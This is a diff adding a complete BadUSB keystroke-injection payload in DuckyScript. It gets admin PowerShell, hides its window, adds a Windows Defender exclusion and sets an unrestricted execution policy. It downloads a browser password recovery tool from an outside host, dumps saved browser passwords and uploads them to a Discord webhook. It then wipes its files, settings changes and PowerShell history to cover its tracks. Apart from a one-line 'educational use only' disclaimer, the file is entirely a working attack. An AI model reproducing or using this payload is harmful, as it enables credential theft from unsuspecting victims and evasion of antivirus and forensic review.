@@ -1,0 +1,117 @@
+REM This script runs PowerShell as admin to download and run WebBrowserPassView,
+REM saves the output to a file, and sends it to a Discord webhook.
+REM For educational use only, please act responsible.
+
+REM Open the Run dialog
+GUI r
+DELAY 1000
+
+REM Run PowerShell as administrator
+STRING powershell -Noprofile "Start-Process powershell -verb runas"
+ENTER
+DELAY 2000
+LEFT
+DELAY 50
+ENTER
+DELAY 1100
+
+REM Start a hidden PowerShell window
+STRING PowerShell.exe -WindowStyle hidden
+DELAY 750
+ENTER
+DELAY 1500
+
+REM Create a temp folder and set it as an exclusion for Windows Defender
+STRING cd C:\ ; mkdir temp ; cd temp ; Add-MpPreference -ExclusionPath "C:\temp" ; Set-ExecutionPolicy unrestricted
+ENTER
+DELAY 500
+
+REM Clear the PowerShell window
+STRING clear
+ENTER
+DELAY 1500
+
+REM Download WebBrowserPassView and 7-Zip, then extract WebBrowserPassView
+STRING Invoke-WebRequest -Uri https://cdn.lullaby.cafe/file/webpassview.zip -OutFile webpassview.zip ; Invoke-WebRequest -Uri https://cdn.lullaby.cafe/file/7z.zip -OutFile 7z.zip ; Expand-Archive 7z.zip ; .\7z\7za.exe e webpassview.zip;
+ENTER
+DELAY 5000
+
+REM Run WebBrowserPassView
+STRING .\WebBrowserPassView.exe
+ENTER
+DELAY 1500
+
+REM Select all data from WebBrowserPassView
+CTRL A
+DELAY 500
+
+REM Save the selected data
+CTRL S
+DELAY 1500
+
+REM Set the file path for saving the output as temp.html in C:\temp
+STRING C:\temp\temp.html
+ENTER
+DELAY 500
+
+REM Use Alt+F to open the file menu and save the file
+ALT f
+DELAY 1500
+DOWN
+DOWN
+ENTER
+DELAY 3000
+ENTER
+ENTER
+DELAY 1000
+
+REM Start new PowerShell process for webhook
+GUI r
+DELAY 1000
+STRING powershell -Noprofile "Start-Process powershell -verb runas"
+ENTER
+DELAY 2000
+LEFT
+DELAY 50
+ENTER
+DELAY 750
+
+REM Start another hidden PowerShell window
+STRING PowerShell.exe -WindowStyle hidden
+DELAY 750
+ENTER
+DELAY 1500
+
+REM Set the Discord webhook URL for file upload
+STRING $webhook = 'YOUR_WEBHOOK_HERE'
+ENTER
+DELAY 500
+
+REM Upload the saved temp.html file to the Discord webhook
+STRING curl.exe -F "file1=@C:\temp\temp.html" $webhook
+ENTER
+DELAY 2000
+
+REM Remove the temp.html file from the system
+STRING Remove-Item -Path "C:\temp\temp.html" -Force
+ENTER
+DELAY 1000
+
+REM Clear the PowerShell window, navigate out of the temp directory, and delete the temp folder
+STRING clear ; cd .. ; rm -r temp/ -Force
+ENTER
+DELAY 1000
+
+REM Remove the exclusion for C:\temp from Windows Defender and set the execution policy back to restricted
+STRING Remove-MpPreference -ExclusionPath "C:\temp" ; Set-ExecutionPolicy restricted -Force
+ENTER
+DELAY 1500
+
+REM Delete the PowerShell command history to remove traces of the script
+STRING Remove-Item (Get-PSreadlineOption).HistorySavePath -Force
+ENTER
+DELAY 500
+
+REM Terminate all running PowerShell processes to ensure they are closed
+STRING taskkill /IM powershell.exe /F
+ENTER
